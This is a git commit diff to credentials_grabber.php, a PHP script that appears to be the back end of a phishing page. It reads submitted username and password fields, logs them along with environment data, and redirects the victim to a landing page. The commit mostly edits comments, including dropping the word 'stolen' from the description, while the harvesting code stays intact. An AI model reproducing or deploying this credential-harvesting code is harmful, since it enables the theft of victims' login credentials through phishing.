76a66a4a267096a85411c6afb3c3055949badd65
Karim Jaber (Exfil0) <84948741+exfil0@users.noreply.github.com>
2025-02-01 04:19:37 +0200

    Update credentials_grabber.php

--- credentials_grabber.php
+++ credentials_grabber.php
@@ -1,21 +1,20 @@
 <?php
 /**
  * credentials_grabber.php
- * 
- * Logs stolen credentials to credentials.log, then redirects.
+ * Logs credentials, then redirects.
  */
 
 require_once __DIR__ . '/logger.php';
 
-// Log environment info
+// Log environment data
 logEnvironment();
 
 if (isset($_POST['uname']) && isset($_POST['psw'])) {
     $uname = trim($_POST['uname']);
     $psw   = trim($_POST['psw']);
+
     logCredentials($uname, $psw);
 }
 
-// Redirect to landing or a "Loading" page
 header('Location: landing.php');
 exit;
